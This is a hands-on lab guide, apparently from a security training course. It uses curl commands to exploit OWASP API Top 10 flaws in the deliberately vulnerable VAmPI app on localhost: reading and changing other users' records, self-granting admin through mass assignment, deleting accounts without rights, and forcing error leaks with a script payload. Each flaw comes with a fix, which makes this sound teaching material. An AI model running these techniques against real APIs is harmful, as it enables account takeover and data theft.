# Lab 02 — API Security: OWASP API Top 10

**Target:** VAmPI — `http://localhost:6000`
**Profile:** `api` or `full`
**Difficulty:** Beginner → Intermediate
**Estimated time:** 60–75 minutes

---

## Prerequisites

```bash
docker compose --profile api up -d
```

Confirm VAmPI is running:

```bash
curl http://localhost:6000/
```

VAmPI ships with an OpenAPI spec at `http://localhost:6000/openapi.json` and a Swagger UI at `http://localhost:6000/ui/`.

---

## Background

The [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) catalogues the most critical risks in modern APIs. Unlike traditional web vulnerabilities, API flaws often surface in business logic — wrong authorisation checks, over-permissive responses, and weak rate limiting — rather than in obvious injection points.

VAmPI implements a bookstore-style REST API with users and books, intentionally vulnerable across several OWASP API categories.

---

## Part 1 — Reconnaissance

### 1.1 Enumerate the API surface

```bash
curl http://localhost:6000/openapi.json | python3 -m json.tool
```

Note the endpoints:

| Endpoint | Method | Description |
|---|---|---|
| `/users/v1` | GET | List all users |
| `/users/v1/register` | POST | Register a new user |
| `/users/v1/login` | POST | Login and receive a JWT |
| `/users/v1/{username}` | GET | Get user details |
| `/users/v1/{username}` | DELETE | Delete a user |
| `/users/v1/{username}/email` | PUT | Update email |
| `/books/v1` | GET | List all books |
| `/books/v1` | POST | Add a book (auth required) |

### 1.2 Register and authenticate

```bash
# Register a test user
curl -s -X POST http://localhost:6000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd","email":"attacker@lab.local"}'

# Login
curl -s -X POST http://localhost:6000/users/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"P@ssw0rd"}'
```

Copy the JWT from the response — you'll use it as `<YOUR_TOKEN>` throughout this lab.

---

## Part 2 — API1: Broken Object Level Authorization (BOLA)

BOLA (formerly IDOR) occurs when the API trusts user-supplied object IDs without verifying that the requesting user owns the resource.

### 2.1 List all users (excessive data exposure)

```bash
curl http://localhost:6000/users/v1
```

The response returns every user, including their email addresses and admin flag — information that should be access-controlled.

### 2.2 Access another user's record directly

```bash
curl http://localhost:6000/users/v1/admin
```

You can retrieve any user's profile by guessing or enumerating usernames — no authentication required.

### 2.3 Update another user's email

```bash
curl -s -X PUT http://localhost:6000/users/v1/admin/email \
  -H "Authorization: Bearer <YOUR_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"email":"pwned@attacker.com"}'
```

The API updates the **admin** account's email using **attacker**'s token. The endpoint checks only that a valid JWT is present, not that the JWT belongs to the target user.

**Fix:** Validate that `token.username == path_param.username` before allowing mutations.

---

## Part 3 — API2: Broken Authentication

### 3.1 Mass-assignment privilege escalation

Register a new user and include extra fields not shown in the official docs:

```bash
curl -s -X POST http://localhost:6000/users/v1/register \
  -H "Content-Type: application/json" \
  -d '{"username":"eviladmin","password":"P@ssw0rd","email":"evil@lab.local","admin":true}'
```

Login as `eviladmin` and inspect the JWT payload (base64-decode the middle segment):

```bash
echo "<middle_jwt_segment>" | base64 -d 2>/dev/null
```

The `admin` field is set to `true` — the API accepted and stored unsanitised input directly into the user object.

### 3.2 Verify admin access

```bash
curl -s -X DELETE http://localhost:6000/users/v1/attacker \
  -H "Authorization: Bearer <EVIL_ADMIN_TOKEN>"
```

The delete succeeds — an endpoint that should be admin-only accepted a token minted for a user who self-assigned the admin role.

**Fix:** Never accept client-supplied privilege fields during registration. Set roles server-side only.

---

## Part 4 — API3: Broken Object Property Level Authorization

### 4.1 Sensitive data in response

```bash
curl http://localhost:6000/users/v1/admin
```

The response includes the password hash even for unauthenticated GET requests. A correctly designed API would return only public fields (`username`, `email`) and never expose hashed credentials.

**Fix:** Use response schemas (allowlists) that explicitly enumerate the fields to return. Never return password hashes — not even hashed ones.

---

## Part 5 — API5: Broken Function Level Authorization

### 5.1 Access admin-only delete endpoint as a normal user

```bash
curl -s -X DELETE http://localhost:6000/users/v1/admin \
  -H "Authorization: Bearer <YOUR_ATTACKER_TOKEN>"
```

Normal users can delete any account. The API does not enforce that `DELETE /users/v1/{username}` requires admin privileges.

**Fix:** Define a role matrix upfront. Enforce it in middleware, not scattered across individual handlers.

---

## Part 6 — API8: Security Misconfiguration

### 6.1 Force a stack trace

```bash
curl "http://localhost:6000/books/v1?INJECT=<script>alert(1)</script>"
```

VAmPI may return a full Python traceback or internal path information in the error response, leaking implementation details useful for further exploitation.

**Fix:** Return generic error messages to clients. Log verbose details server-side only. Disable debug mode in production.

---

## Summary

| OWASP API Risk | Demonstrated via |
|---|---|
| API1: BOLA | Accessing/modifying any user's record with another user's token |
| API2: Broken Auth | Mass-assignment to self-grant admin role at registration |
| API3: Broken Object Property Level Auth | Password hash returned in unauthenticated GET |
| API5: Broken Function Level Auth | Non-admin deleting any user account |
| API8: Security Misconfiguration | Stack traces in error responses |

---

## Going Further with crAPI

crAPI (`http://localhost:2590`) provides a more realistic multi-service scenario covering the same OWASP API Top 10 categories in a car-sharing application context. Check the email inbox at `http://localhost:2592` for registration confirmation and password-reset flows.

---

## Next Steps

- Lab 03: [Cross-Site Scripting with OWASP Juice Shop](./03-xss-juice-shop.md)
- Try the same BOLA technique against the custom Vulnerable API at `http://localhost:2500`
